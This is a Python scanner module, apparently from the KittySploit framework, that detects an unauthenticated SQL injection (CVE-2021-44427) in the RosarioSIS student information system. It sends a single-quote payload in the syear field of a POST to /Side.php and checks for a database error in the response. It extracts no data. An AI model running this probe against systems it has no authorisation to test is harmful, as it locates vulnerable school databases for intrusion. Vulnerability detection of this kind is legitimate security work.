#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An unauthenticated SQL injection vulnerability in Rosario Student Information System (aka rosariosis) 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Rosario Student Information System Unauthenticated SQL Injection Detection',
        'description': 'An unauthenticated SQL injection vulnerability in Rosario Student Information System (aka rosariosis) 8.1 and below allow remote attackers to execute PostgreSQL statements (e.g., SELECT, INSERT, UPDATE, and DELETE) through /Side.php via the syear parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'sqli', 'rosariosis', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gitlab.com/francoisjacquet/rosariosis/-/issues/328',
            'https://twitter.com/RemotelyAlerts/status/1465697928178122775',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-44427',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-44427',
    }

    def run(self):
        path = '/Side.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}, data="sidefunc=update&syear=111'")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('DB Execute Failed. ERROR:', 'unterminated quoted string',)
        header_any = ('RosarioSIS=',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason='Rosario Student Information System Unauthenticated SQL Injection detected',
                path=path,
            )
            return True
        return False

